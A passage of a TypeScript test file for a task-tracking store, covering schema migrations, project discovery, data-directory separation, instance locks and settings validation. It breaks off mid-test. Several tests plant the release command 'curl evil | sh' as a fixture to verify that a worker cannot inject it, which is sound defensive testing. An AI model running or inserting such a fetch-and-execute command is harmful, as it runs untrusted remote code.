		const dir = join(root, "backlog-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		// The current column set with the pre-backlog stage list: what open() must rebuild.
		const ref = await open(join(root, "backlog-schema-ref"));
		await ref.close();
		const refDb = new Database(
			join(root, "backlog-schema-ref", ".tasks", "tasks.db"),
		);
		const ddl =
			refDb
				.query<{ sql: string }, []>(
					"SELECT sql FROM sqlite_master WHERE type = 'table' AND name = 'tasks'",
				)
				.get()?.sql ?? "";
		refDb.close();
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		db.exec(
			ddl.replace(
				"stage IN ('todo','in_progress','merging','done','backlog')",
				"stage IN ('todo','in_progress','merging','done')",
			),
		);
		db.exec(
			`INSERT INTO tasks (id, title, stage, state, created_at, updated_at, topic, work_check_log, queued_at)
				VALUES ('seed1', 'parked idea', 'todo', 'queued', 1, 1, 'auth', '[]', 5)`,
		);
		db.close();

		const store = await open(dir);
		// The named-column copy kept the values the DDL's tail columns hold.
		expect((await store.getTask("seed1"))?.topic).toBe("auth");
		expect((await store.getTask("seed1"))?.queuedAt).toBe(5);
		expect((await store.getTask("seed1"))?.workCheckLog).toEqual([]);
		// The old CHECK rejected exactly this write.
		await store.updateTask("seed1", { stage: "backlog", state: "idle" });
		expect((await store.getTask("seed1"))?.stage).toBe("backlog");
		await writeLaterRebuildFields(store);
		await expectLaterRebuildFields(store);
		await store.close();
		await expectCheckSchemaMatchesFresh(dir);

		// The constraint change is durable across a reopen.
		const reopened = await open(dir);
		expect((await reopened.getTask("seed1"))?.stage).toBe("backlog");
		await expectLaterRebuildFields(reopened);
		await reopened.close();
	});

	test("open adds the topic column and backfills done rows in one pass", async () => {
		const dir = join(root, "topic-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		db.exec(OLD_TASKS_DDL); // no topic column, old state CHECK
		db.exec(
			`INSERT INTO tasks (id, title, session_title, stage, state, created_at, updated_at, done_at) VALUES
				('t1', 'Fix login redirect bug', 'auth: fix the login redirect', 'done', 'idle', 1, 1, 100),
				('t2', 'Add login rate limit', 'auth: add login rate limit', 'done', 'idle', 2, 2, 200),
				('t3', 'Harden token refresh', 'retry: harden token refresh', 'done', 'idle', 3, 3, 300),
				('t4', 'Fix signup crash on the settings page', NULL, 'done', 'idle', 4, 4, 400),
				('t5', 'Polish the readme', NULL, 'todo', 'queued', 5, 5, NULL)`,
		);
		db.close();

		// One open converges: the column lands after the state-CHECK rebuild, so the
		// rebuild's named-column copy cannot drop the freshly backfilled labels.
		const store = await open(dir);
		expect((await store.getTask("t1"))?.topic).toBe("login"); // df 6 beats auth's 4
		expect((await store.getTask("t2"))?.topic).toBe("login");
		expect((await store.getTask("t3"))?.topic).toBe("harden"); // highest-df pick: harden 5 beats retry 4
		expect((await store.getTask("t4"))?.topic).toBeNull(); // no term reaches df 3
		expect((await store.getTask("t5"))?.topic).toBeNull(); // never done, never backfilled
		await store.close();

		// Idempotent: labels survive a reopen unchanged.
		const reopened = await open(dir);
		expect((await reopened.getTask("t1"))?.topic).toBe("login");
		await reopened.close();
	});

	test("open adds the kind column and backfills pre-kind marker cards", async () => {
		const dir = join(root, "kind-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		db.exec(OLD_TASKS_DDL); // no kind column
		db.exec(
			`INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at, release_version) VALUES
				('r1', 'retro', '${RETRO_MARKER}the card', 'done', 'idle', 1, 1, NULL),
				('r2', 'interview', '${RULES_INTERVIEW_MARKER}proj', 'done', 'idle', 2, 2, NULL),
				('r3', 'review', '${ARCH_REVIEW_MARKER}x', 'done', 'idle', 3, 3, NULL),
				('r4', 'release', '${ARCH_REVIEW_MARKER}the release', 'done', 'idle', 4, 4, 'v1.0.0'),
				('r5', 'plain', 'fix the bug', 'todo', 'queued', 5, 5, NULL)`,
		);
		db.close();

		const store = await open(dir);
		expect((await store.getTask("r1"))?.kind).toBe("retro");
		expect((await store.getTask("r2"))?.kind).toBe("interview");
		expect((await store.getTask("r3"))?.kind).toBe("review");
		// A released card keeps kind 'work': it is a release, not a review.
		expect((await store.getTask("r4"))?.kind).toBe("work");
		expect((await store.getTask("r5"))?.kind).toBe("work");
		await store.close();

		// Idempotent across a reopen.
		const reopened = await open(dir);
		expect((await reopened.getTask("r1"))?.kind).toBe("retro");
		expect((await reopened.getTask("r4"))?.kind).toBe("work");
		await reopened.close();
	});

	test("createTask with a marker prompt and no kind arg returns kind work", async () => {
		const store = await open(join(root, "kind-fresh"));
		for (const prompt of [
			`${RETRO_MARKER}x`,
			`${ARCH_REVIEW_MARKER}x`,
			`${RULES_INTERVIEW_MARKER}x`,
			"fix the bug",
		]) {
			expect((await store.createTask(prompt)).kind).toBe("work");
		}
		await store.close();
	});

	test("open converges pre-fix proposal reasons and keeps them on a reopen", async () => {
		const store = await open(join(root, "proposal-reason-converge"));
		const retro = await store.createTask("a proposal");
		await store.updateTask(retro.id, {
			state: "needs_you",
			needsReason:
				"Proposed by the retro of Retro of the card. Accept to start it, edit the prompt first, or cancel to decline.",
		});
		const fork = await store.createTask("a fork proposal");
		await store.updateTask(fork.id, {
			state: "needs_you",
			needsReason:
				"Proposed by the fork research Fork research: ottr-ai/ottr. Accept to start it, edit the prompt first, or cancel to decline.",
		});
		// A non-proposal reason must survive the pass untouched.
		const plain = await store.createTask("a crashed card");
		await store.updateTask(plain.id, {
			state: "needs_you",
			needsReason: "omp exited with code 1 before finishing",
		});
		await store.close();

		const reopened = await open(join(root, "proposal-reason-converge"));
		expect((await reopened.getTask(retro.id))!.needsReason).toBe(
			"Proposed by the retro of the card. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
		);
		expect((await reopened.getTask(fork.id))!.needsReason).toBe(
			"Proposed by the fork research ottr-ai/ottr. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
		);
		expect((await reopened.getTask(plain.id))!.needsReason).toBe(
			"omp exited with code 1 before finishing",
		);
		await reopened.close();

		// Idempotent: the converged text survives another open unchanged.
		const again = await open(join(root, "proposal-reason-converge"));
		expect((await again.getTask(retro.id))!.needsReason).toBe(
			"Proposed by the retro of the card. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
		);
		await again.close();
	});

	test("open recovers the source id for legacy proposal reasons through the follow-up chain", async () => {
		const store = await open(join(root, "proposal-reason-id"));
		// A legacy retro proposal two hops down: proposal → retro → source.
		const source = await store.createTask("the pinned session name");
		const retro = await store.createTask("a retro");
		await store.updateTask(retro.id, { followUpOf: source.id, stage: "done" });
		const held = await store.createTask("a held proposal");
		await store.updateTask(held.id, {
			followUpOf: retro.id,
			state: "needs_you",
			needsReason:
				"Proposed by the retro of the pinned session name. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
		});
		// A legacy retro proposal whose retro has no parent names the retro itself.
		const loneRetro = await store.createTask("an orphan retro");
		const loneHeld = await store.createTask("another held proposal");
		await store.updateTask(loneHeld.id, {
			followUpOf: loneRetro.id,
			state: "needs_you",
			needsReason:
				"Proposed by the retro of an orphan retro. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
		});
		// A legacy fork proposal names the result card one hop up.
		const forkCard = await store.createTask("fork research");
		const forkHeld = await store.createTask("a fork proposal");
		await store.updateTask(forkHeld.id, {
			followUpOf: forkCard.id,
			state: "needs_you",
			needsReason:
				"Proposed by the fork research the repo. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
		});
		// The 2026-11 wording already carries the id: only the quoted title drops.
		const quoted = await store.createTask("a quoted proposal");
		await store.updateTask(quoted.id, {
			followUpOf: loneRetro.id,
			state: "needs_you",
			needsReason:
				'Retro proposal from t9 ("the widget"). Accept starts it. Edit task changes the prompt first. Cancel task declines it.',
		});
		await store.close();

		const reopened = await open(join(root, "proposal-reason-id"));
		expect((await reopened.getTask(held.id))!.needsReason).toBe(
			`Retro proposal from ${source.id}. Accept starts it. Edit task changes the prompt first. Cancel task declines it.`,
		);
		expect((await reopened.getTask(loneHeld.id))!.needsReason).toBe(
			`Retro proposal from ${loneRetro.id}. Accept starts it. Edit task changes the prompt first. Cancel task declines it.`,
		);
		expect((await reopened.getTask(forkHeld.id))!.needsReason).toBe(
			`Fork proposal from ${forkCard.id}. Accept starts it. Edit task changes the prompt first. Cancel task declines it.`,
		);
		expect((await reopened.getTask(quoted.id))!.needsReason).toBe(
			"Retro proposal from t9. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
		);
		await reopened.close();

		// Idempotent: the id-only text survives another open unchanged.
		const again = await open(join(root, "proposal-reason-id"));
		expect((await again.getTask(held.id))!.needsReason).toBe(
			`Retro proposal from ${source.id}. Accept starts it. Edit task changes the prompt first. Cancel task declines it.`,
		);
		expect((await again.getTask(quoted.id))!.needsReason).toBe(
			"Retro proposal from t9. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
		);
		await again.close();
	});

	test("fresh databases: new tasks carry a null topic and updateTask can set it", async () => {
		const store = await open(join(root, "topic-fresh"));
		const task = await store.createTask("brand new");
		// toBeNull fails on undefined: proves the field is present, not just falsy.
		expect(task.topic).toBeNull();
		expect((await store.updateTask(task.id, { topic: "auth" })).topic).toBe(
			"auth",
		);
		expect((await store.updateTask(task.id, { topic: null })).topic).toBeNull();
		await store.close();
	});

	test("an older database without shots converges on open and persists task shots", async () => {
		const dir = join(root, "shots-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		db.exec(OLD_TASKS_DDL); // no shots column
		db.exec(
			"INSERT INTO tasks (id, title, stage, state, created_at, updated_at) VALUES ('seed1', 'old', 'todo', 'queued', 1, 1)",
		);
		db.close();

		const store = await open(dir);
		expect((await store.getTask("seed1"))?.shots).toEqual([]);
		const task = await store.createTask("after migration");
		expect(
			(await store.updateTask(task.id, { shots: ["1.png"] })).shots,
		).toEqual(["1.png"]);
		await store.close();

		const reopened = await open(dir);
		expect((await reopened.getTask(task.id))?.shots).toEqual(["1.png"]);
		await reopened.close();
	});

	// Regression for R4-4: one open must converge the oldest shapes to the current schema.
	// Deleting any ALTER in ProjectStore.open makes a write here fail with "no such column".
	test("a legacy database converges: every current column exists, is writable, and survives a reopen", async () => {
		const dir = join(root, "legacy-convergence");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		db.exec(OLD_TASKS_DDL); // oldest tasks shape (no report/research/shots/push_sha/topic/depends_on)
		// Turns as they were before the model and input columns existed.
		db.exec(`CREATE TABLE turns (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			task_id TEXT NOT NULL,
			kind TEXT NOT NULL CHECK (kind IN ('work','merge')),
			prompt TEXT NOT NULL,
			started_at INTEGER NOT NULL,
			ended_at INTEGER,
			pid INTEGER,
			exit_code INTEGER,
			outcome TEXT,
			summary TEXT,
			details TEXT,
			question TEXT,
			error TEXT
		)`);
		db.exec(
			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('leg1', 'legacy', 'legacy prompt', 'todo', 'queued', 1, 1)",
		);
		db.close();

		const store = await open(dir);
		await store.updateTask("leg1", { pushSha: "abc", dependsOn: ["x"] });
		await store.startTurn("leg1", "work", "legacy turn", null, "turn input");
		await store.finishTurn((await store.listTurns("leg1"))[0]!.id, {
			model: "glm",
			ranOn: "worker-a (abc)",
		});
		await store.close();

		const reopened = await open(dir);
		expect((await reopened.getTask("leg1"))?.pushSha).toBe("abc");
		expect((await reopened.getTask("leg1"))?.dependsOn).toEqual(["x"]);
		expect((await reopened.listTurns("leg1"))[0]?.model).toBe("glm");
		expect((await reopened.listTurns("leg1"))[0]?.ranOn).toBe("worker-a (abc)");
		expect((await reopened.listTurns("leg1"))[0]?.input).toBe("turn input");
		await reopened.close();

		// Column convergence: the upgraded schema must match a fresh schema exactly.
		// A new Task/Turn field lands in both automatically; a missing live migration fails here.
		const probe = new Database(join(dir, ".tasks", "tasks.db"));
		const fresh = await open(join(root, "migration-fresh"));
		const freshDb = new Database(
			join(root, "migration-fresh", ".tasks", "tasks.db"),
		);
		await fresh.close();
		for (const table of ["tasks", "turns"]) {
			const cols = (db: Database) =>
				db
					.query<{ name: string }, []>(`PRAGMA table_info(${table})`)
					.all()
					.map((c) => c.name)
					.sort();
			expect(cols(probe)).toEqual(cols(freshDb));
		}
		probe.close();
		freshDb.close();
	});
});

describe("discoverProjects", () => {
	test("extra paths outside the roots are found; dups collapse; missing dirs skip", async () => {
		const rootA = join(root, "disc-root");
		const inRoot = join(rootA, "inside");
		const outside = join(root, "disc-outside");
		for (const dir of [inRoot, outside]) await open(dir);
		mkdirSync(join(root, "disc-empty"), { recursive: true });
		const found = discoverProjects(
			[rootA],
			[outside, outside, join(root, "disc-empty"), join(root, "disc-missing")],
		);
		expect(found).toContain(inRoot);
		expect(found).toContain(outside);
		expect(found.filter((p) => p === outside)).toHaveLength(1);
		expect(found).not.toContain(join(root, "disc-empty"));
	});

	// Regression for R4-3: the board keys projects (and their OTTR_DATA_DIR data dirs) by
	// basename, so discovery must never return two paths with the same folder name.
	test("a basename collision keeps one path; the explicit extra path wins", async () => {
		const rootA = join(root, "collide-a", "app");
		const rootB = join(root, "collide-b", "app");
		const explicit = join(root, "collide-extra", "app");
		for (const dir of [rootA, rootB, explicit]) await open(dir);
		expect(
			discoverProjects(
				[join(root, "collide-a"), join(root, "collide-b")],
				[explicit],
			),
		).toEqual([explicit]);
		// Root scans alone also collapse: the first root's hit wins deterministically.
		expect(
			discoverProjects([join(root, "collide-b"), join(root, "collide-a")]),
		).toEqual([rootB]);
	});

	// Regression: a removed project must drop out before the basename dedupe, or it claims
	// the folder name and hides a wanted same-name project in another root.
	test("a removed path cannot mask a wanted duplicate elsewhere", async () => {
		const rootA = join(root, "mask-a", "app");
		const rootB = join(root, "mask-b", "app");
		for (const dir of [rootA, rootB]) await open(dir);
		expect(
			discoverProjects(
				[join(root, "mask-a"), join(root, "mask-b")],
				[],
				[rootA],
			),
		).toEqual([rootB]);
	});
});

describe("OTTR_DATA_DIR", () => {
	test("task data lives in the data dir, where discovery and a reopen find it", async () => {
		const data = join(root, "data-dir");
		const parent = join(root, "data-root");
		const proj = join(parent, "proj");
		mkdirSync(proj, { recursive: true });
		const saved = process.env.OTTR_DATA_DIR;
		process.env.OTTR_DATA_DIR = data;
		try {
			const store = await ProjectStore.init(proj);
			opened.push(store);
			const t = await store.createTask("kept outside the checkout");
			expect(existsSync(join(data, "proj", "tasks.db"))).toBe(true);
			expect(await store.logPath(t.id)).toBe(
				join(data, "proj", "logs", `${t.id}.log`),
			);
			expect(store.sessionsDir).toBe(join(data, "proj", "sessions"));
			expect(existsSync(join(proj, ".tasks"))).toBe(false);
			expect(existsSync(join(proj, ".worktrees"))).toBe(true); // worktrees stay in the clone
			expect(discoverProjects([parent])).toEqual([proj]);
			await store.close();
			expect((await (await open(proj)).getTask(t.id))?.prompt).toBe(
				"kept outside the checkout",
			);
		} finally {
			if (saved === undefined) delete process.env.OTTR_DATA_DIR;
			else process.env.OTTR_DATA_DIR = saved;
		}
		// Without the setting the checkout holds no store, so discovery skips it.
		expect(discoverProjects([parent])).toEqual([]);
	});
});

describe("OTTR_SERVER_DATA_DIR", () => {
	/** Runs `fn` with both dirs set (`server` undefined: unset), then restores the env. */
	const withDirs = async <T>(
		data: string,
		server: string | undefined,
		fn: () => T | Promise<T>,
	): Promise<T> => {
		const saved = [process.env.OTTR_DATA_DIR, process.env.OTTR_SERVER_DATA_DIR];
		process.env.OTTR_DATA_DIR = data;
		if (server === undefined) delete process.env.OTTR_SERVER_DATA_DIR;
		else process.env.OTTR_SERVER_DATA_DIR = server;
		try {
			return await fn();
		} finally {
			if (saved[0] === undefined) delete process.env.OTTR_DATA_DIR;
			else process.env.OTTR_DATA_DIR = saved[0];
			if (saved[1] === undefined) delete process.env.OTTR_SERVER_DATA_DIR;
			else process.env.OTTR_SERVER_DATA_DIR = saved[1];
		}
	};
	/** A valid tracker DB at `<data>/<name>/tasks.db`, as an older board (or a worker) leaves it. */
	const legacyDb = async (data: string, proj: string, releaseCommand: string) =>
		await withDirs(data, undefined, async () => {
			const store = await ProjectStore.open(proj);
			await store.createTask("legacy task");
			await store.setSettings({ releaseCommand });
			await store.close();
		});

	test("tasks.db lives in the server dir; logs and sessions stay in the data dir", async () => {
		const base = join(root, "server-dir-layout");
		const data = join(base, "data");
		const server = join(base, "server");
		const parent = join(base, "checkouts");
		const proj = join(parent, "proj");
		mkdirSync(proj, { recursive: true });
		await withDirs(data, server, async () => {
			const store = await ProjectStore.init(proj);
			opened.push(store);
			const t = await store.createTask("trusted state");
			expect(store.serverDir).toBe(join(server, "proj"));
			expect(existsSync(join(server, "proj", "tasks.db"))).toBe(true);
			expect(existsSync(join(data, "proj", "tasks.db"))).toBe(false);
			expect(await store.logPath(t.id)).toBe(
				join(data, "proj", "logs", `${t.id}.log`),
			);
			expect(store.sessionsDir).toBe(join(data, "proj", "sessions"));
			expect(discoverProjects([parent])).toEqual([proj]);
			await store.close();
			expect((await (await open(proj)).getTask(t.id))?.prompt).toBe(
				"trusted state",
			);
		});
	});

	test("a worker rewriting the data dir cannot change releaseCommand", async () => {
		const base = join(root, "server-dir-worker");
		const data = join(base, "data");
		const server = join(base, "server");
		const proj = join(base, "checkouts", "proj");
		mkdirSync(proj, { recursive: true });
		await withDirs(data, server, async () => {
			const store = await ProjectStore.init(proj);
			await store.setSettings({ releaseCommand: "bun run release" });
			await store.close();
		});
		// The worker plants a valid tracker DB and overwrites everything else it can reach.
		await legacyDb(data, proj, "curl evil | sh");
		for (const entry of readdirSync(data, {
			recursive: true,
			withFileTypes: true,
		})) {
			if (entry.isFile() && entry.name !== "tasks.db")
				writeFileSync(join(entry.parentPath, entry.name), "junk");
		}
		await withDirs(data, server, async () => {
			expect((await (await open(proj)).getSettings()).releaseCommand).toBe(
				"bun run release",
			);
		});
	});

	test("a tasks.db planted in the data dir makes no project", async () => {
		const base = join(root, "server-dir-plant");
		const data = join(base, "data");
		const server = join(base, "server");
		const parent = join(base, "checkouts");
		const evil = join(parent, "evil");
		mkdirSync(evil, { recursive: true });
		await legacyDb(data, evil, "curl evil | sh");
		expect(existsSync(join(data, "evil", "tasks.db"))).toBe(true);
		await withDirs(data, server, async () => {
			expect(discoverProjects([parent])).toEqual([]);
		});
	});

	test("adoption moves a legacy DB once and ignores later plants", async () => {
		const base = join(root, "server-dir-adopt");
		const data = join(base, "data");
		const server = join(base, "server");
		const proj = join(base, "checkouts", "proj");
		mkdirSync(proj, { recursive: true });
		await legacyDb(data, proj, "bun run release");
		expect(adoptSharedProjectData(data, server)).toEqual([
			{ name: "proj", status: "adopted" },
		]);
		expect(existsSync(join(data, "proj", "tasks.db"))).toBe(false);
		expect(existsSync(join(data, "proj", "tasks.db.moved-to-server"))).toBe(
			true,
		);
		expect(existsSync(join(server, ".adopted"))).toBe(true);
		await withDirs(data, server, async () => {
			const store = await open(proj);
			expect((await store.listTasks()).map((t) => t.prompt)).toEqual([
				"legacy task",
			]);
			expect((await store.getSettings()).releaseCommand).toBe(
				"bun run release",
			);
			await store.close();
		});
		await legacyDb(data, join(base, "checkouts", "other"), "curl evil | sh");
		expect(adoptSharedProjectData(data, server)).toEqual([]);
		expect(existsSync(join(server, "other", "tasks.db"))).toBe(false);
	});

	test.skipIf(process.platform === "win32")(
		"adoption skips symlinked dirs and reports a corrupt DB without stopping",
		async () => {
			const base = join(root, "server-dir-adopt-mixed");
			const data = join(base, "data");
			const server = join(base, "server");
			const outside = join(base, "outside");
			await legacyDb(
				outside,
				join(base, "checkouts", "linked"),
				"curl evil | sh",
			);
			mkdirSync(data, { recursive: true });
			symlinkSync(join(outside, "linked"), join(data, "linked"));
			mkdirSync(join(data, "broken"), { recursive: true });
			writeFileSync(
				join(data, "broken", "tasks.db"),
				"not a sqlite file at all",
			);
			await legacyDb(data, join(base, "checkouts", "good"), "bun run release");
			const results = adoptSharedProjectData(data, server).sort((a, b) =>
				a.name.localeCompare(b.name),
			);
			expect(results.map((r) => [r.name, r.status])).toEqual([
				["broken", "failed"],
				["good", "adopted"],
			]);
			expect(results[0]?.error).toBeTruthy();
			expect(existsSync(join(server, "good", "tasks.db"))).toBe(true);
			expect(existsSync(join(server, "linked"))).toBe(false);
			expect(existsSync(join(outside, "linked", "tasks.db"))).toBe(true);
			expect(existsSync(join(server, ".adopted"))).toBe(true);
		},
	);
});

describe("release notes persistence", () => {
	test("edited release notes survive a store reopen", async () => {
		const dir = join(root, "release-notes-reopen");
		const store = await open(dir);
		const t = await store.createTask("release me");
		await store.updateTask(t.id, {
			releaseNotes: "persist me",
			releaseVersion: "v1.0.0",
		});
		await store.close();
		const reopened = await open(dir);
		expect((await reopened.getTask(t.id))!.releaseNotes).toBe("persist me");
		await reopened.close();
	});
});

describe("instance lock", () => {
	/** Spawns a real holder process keeping `dir`'s db locked until killed, and awaits readiness. */
	async function spawnHolder(dir: string): Promise<Bun.Subprocess> {
		mkdirSync(dir, { recursive: true }); // the watcher below needs it to exist
		const readyFile = join(dir, ".holder-ready");
		const child = Bun.spawn({
			cmd: [
				"bun",
				"-e",
				`import { ProjectStore } from ${JSON.stringify(join(import.meta.dir, "store.ts"))};
				 await ProjectStore.open(process.env.LOCK_DIR);
				 await Bun.write(process.env.READY_FILE, "1");
				 await new Promise(() => {});`,
			],
			env: { ...process.env, LOCK_DIR: dir, READY_FILE: readyFile },
		});
		// The holder is a real OS process, so its readiness exists only on the
		// platform clock (fake timers cannot drive it). Await the ready-file
		// creation event; the 5 s cap is a failure bound, not a duration guess.
		// Stdio stays inherited so a boot failure prints itself.
		if (!existsSync(readyFile)) {
			const { promise, resolve, reject } = Promise.withResolvers<void>();
			const w = watch(dir, (_event, file) => {
				if (file === ".holder-ready") resolve();
			});
			if (existsSync(readyFile)) resolve(); // landed before the watcher attached
			const cap = setTimeout(
				() =>
					reject(
						new Error(`lock holder failed to start (exit ${child.exitCode})`),
					),
				5000,
			);
			try {
				await promise;
			} finally {
				clearTimeout(cap);
				w.close();
			}
		}
		return child;
	}

	test("a second live opener is refused with StoreLockedError", async () => {
		const dir = join(root, "lock-refused");
		const child = await spawnHolder(dir);
		try {
			let err: unknown;
			try {
				await ProjectStore.open(dir);
			} catch (e) {
				err = e;
			}
			expect(err).toBeInstanceOf(StoreLockedError);
			if (err instanceof StoreLockedError) {
				expect(err.message).toContain(dir);
			}
		} finally {
			child.kill();
			await child.exited;
		}
	});

	test("a SIGKILLed holder's lock is free for the next boot", async () => {
		const dir = join(root, "lock-sigkill");
		const child = await spawnHolder(dir);
		child.kill(9); // no clean close: no release code runs, the OS drops the lock
		await child.exited;
		const second = await open(dir); // whatever pid or hostname the dead holder named
		expect(await second.listTasks()).toEqual([]);
		await second.close();
	});
});

describe("arch-review changed-line coverage", () => {
	/** Makes `dir` discoverable: a folder with a tasks.db inside its data dir. */
	const fakeProject = (dir: string): string => {
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		writeFileSync(join(dir, ".tasks", "tasks.db"), "");
		return dir;
	};

	describe("discoverProjects", () => {
		test("duplicate basenames keep the first root hit; a missing tasks.db is skipped; results are sorted", async () => {
			const rootA = join(root, "ar-disc-a");
			const rootB = join(root, "ar-disc-b");
			mkdirSync(rootA, { recursive: true });
			mkdirSync(rootB, { recursive: true });
			fakeProject(join(rootA, "zeta"));
			fakeProject(join(rootB, "zeta")); // duplicate basename: rootA wins
			mkdirSync(join(rootA, "no-db"), { recursive: true }); // no tasks.db: skipped
			mkdirSync(join(rootA, "empty", ".tasks"), { recursive: true }); // empty data dir: skipped
			fakeProject(join(rootA, "alpha"));
			expect(discoverProjects([rootA, rootB])).toEqual([
				join(rootA, "alpha"),
				join(rootA, "zeta"),
			]);
		});

		test("an explicit extra path shadows a root hit with the same basename", async () => {
			const rootA = join(root, "ar-shadow-root");
			const explicit = join(root, "ar-shadow-explicit", "app");
			mkdirSync(rootA, { recursive: true });
			fakeProject(join(rootA, "app"));
			fakeProject(explicit);
			expect(discoverProjects([rootA], [explicit])).toEqual([explicit]);
		});

		test("a removed path drops out before dedupe, even an explicit extra", async () => {
			const rootA = join(root, "ar-removed-root");
			const rootB = join(root, "ar-removed-root2");
			mkdirSync(rootA, { recursive: true });
			mkdirSync(rootB, { recursive: true });
			const kept = fakeProject(join(rootA, "keep"));
			const goneA = fakeProject(join(rootA, "gone"));
			const goneB = fakeProject(join(rootB, "gone")); // same basename in a second root
			// Without the removal the first root would claim the name; removing it lets the root scan proceed.
			expect(discoverProjects([rootA], [], [goneA])).toEqual([kept]);
			// The removed root hit cannot mask the second root's same-named project.
			expect(discoverProjects([rootA, rootB], [], [goneA])).toEqual([
				kept,
				goneB,
			]);
			// An explicit extra that is removed is excluded too.
			expect(discoverProjects([rootA], [goneA], [goneA])).toEqual([kept]);
			// Removal matches by path, not basename: other spellings of the name stay.
			expect(discoverProjects([rootA], [kept], [goneA])).toEqual([kept]);
		});

		test("a missing or unreadable root is skipped", async () => {
			const rootA = join(root, "ar-skip-root");
			const p = fakeProject(join(rootA, "only"));
			expect(
				discoverProjects([join(root, "ar-does-not-exist"), rootA]),
			).toEqual([p]);
		});
	});

	describe("settings shape validation", () => {
		/** Opens the raw db behind a project dir for direct settings-row writes. */
		const rawDb = (dir: string): Database => {
			const db = new Database(join(dir, ".tasks", "tasks.db"));
			db.exec("PRAGMA busy_timeout = 5000");
			return db;
		};

		test("stored values of the wrong shape keep the default", async () => {
			const dir = join(root, "ar-shape");
			const store = await open(dir);
			await store.close();
			const db = rawDb(dir);
			// number key holding a JSON string; string[] key holding an object
			db.run(
				"INSERT INTO settings (key, value) VALUES ('maxParallel', '\"5\"'), ('copyExtra', '{\"a\":1}'), ('autoTend', 'yes'), ('noSuchKey', '1')",
			);
			db.close();
			const store2 = await open(dir);
			const s = await store2.getSettings();
			expect(s.maxParallel).toBe(DEFAULT_SETTINGS.maxParallel);
			expect(s.copyExtra).toEqual([]);
			expect(s.autoTend).toBe(DEFAULT_SETTINGS.autoTend);
			// An unknown settings key must not leak its stored value into the result.
			expect("noSuchKey" in s).toBe(false);
			await store2.close();
		});

		test("a null maxParallel round-trips as no cap", async () => {
			const dir = join(root, "ar-null-parallel");
			const store = await open(dir);
			await store.setSettings({ maxParallel: null });
			expect((await store.getSettings()).maxParallel).toBeNull();
			await store.close();
			const store2 = await open(dir);
			expect((await store2.getSettings()).maxParallel).toBeNull();
			await store2.close();
		});

		test("string[] values map entries through String()", async () => {
			const dir = join(root, "ar-stringmap");
			const store = await open(dir);
			await store.close();
			const db = rawDb(dir);
			db.run(
				"INSERT INTO settings (key, value) VALUES ('copyExtra', '[\"a\", 2, null, true]')",
			);
			db.close();
			const store2 = await open(dir);
			expect((await store2.getSettings()).copyExtra).toEqual([
				"a",
				"2",
				"null",
				"true",
			]);
			await store2.close();
		});

		test("corrupt JSON on a number key keeps that key's default only", async () => {
			const dir = join(root, "ar-corrupt-num");
			let store = await open(dir);
			await store.setSettings({ maxParallel: 4, keptWorktreeDays: 2 });
			await store.close();
			const db = rawDb(dir);
			db.run("UPDATE settings SET value = '{oops' WHERE key = 'maxParallel'");
			db.close();
			store = await open(dir);
			const s = await store.getSettings();
			expect(s.maxParallel).toBe(DEFAULT_SETTINGS.maxParallel);
			expect(s.keptWorktreeDays).toBe(2);
			await store.close();
		});

		test("returned settings are a deep copy: mutating them touches neither the defaults nor a later read", async () => {
			const store = await open(join(root, "ar-deepcopy"));
			const first = await store.getSettings();
			first.copyExtra.push(".env");
			first.tendChurnGlobs.push("**/*");
			expect(DEFAULT_SETTINGS.copyExtra).toEqual([]);
			expect(DEFAULT_SETTINGS.tendChurnGlobs).toEqual([]);
			const second = await store.getSettings();
			expect(second.copyExtra).toEqual([]);
			expect(second.tendChurnGlobs).toEqual([]);
			await store.close();
		});

		test("a reset stores JSON null and unknown patch keys are ignored; the return equals getSettings()", async () => {
			const dir = join(root, "ar-reset-null");
			const store = await open(dir);
			await store.setSettings({ displayName: "X", maxParallel: 3 });
			const returned = await store.setSettings({
				displayName: null,
				noSuchKey: 99,
			} as unknown as { displayName: string | null });
			expect(returned).toEqual(await store.getSettings());
			await store.close();
			// Raw reads need the store closed: the board opens its DBs in exclusive locking mode.
			const db = rawDb(dir);
			expect(
				db
					.query<{ value: string }, []>(
						"SELECT value FROM settings WHERE key = 'displayName'",
					)
					.get()?.value,
			).toBe("null");
			// The unknown key never got a row.
			expect(
				db
					.query<{ n: number }, []>(
						"SELECT COUNT(*) AS n FROM settings WHERE key = 'noSuchKey'",
					)
					.get()?.n,
			).toBe(0);
			db.close();
			const reopened = await open(dir);
			expect((await reopened.getSettings()).displayName).toBeNull();
			expect((await reopened.getSettings()).maxParallel).toBe(3);
			await reopened.close();
		});
	});

	describe("task patch mapping", () => {
		test("createTask returns exactly the stored row", async () => {
			const store = await open(join(root, "ar-create-readback"));
			const task = await store.createTask("first line\nsecond line", "m/x");
			expect(task).toEqual((await store.getTask(task.id))!);
			expect(task.title).toBe("first line");
			await store.close();
		});

		test("updateTask maps patch keys to columns, serializes arrays as JSON, and bumps updated_at", async () => {
			const dir = join(root, "ar-patch-cols");
			const store = await open(dir);
			const task = await store.createTask("patch me");
			const before = (await store.getTask(task.id))!;
			while (Date.now() <= before.updatedAt) {}
			await store.updateTask(task.id, {
				needsReason: "why",
				pendingPrompt: "later",
				sessionId: "sess-1",
				dependsOn: ["t9"],
				images: ["a.png", "b.png"],
				keptFiles: ["k.txt"],
				asked: [],
				releaseVersion: "v9",
			});
			const after = (await store.getTask(task.id))!;
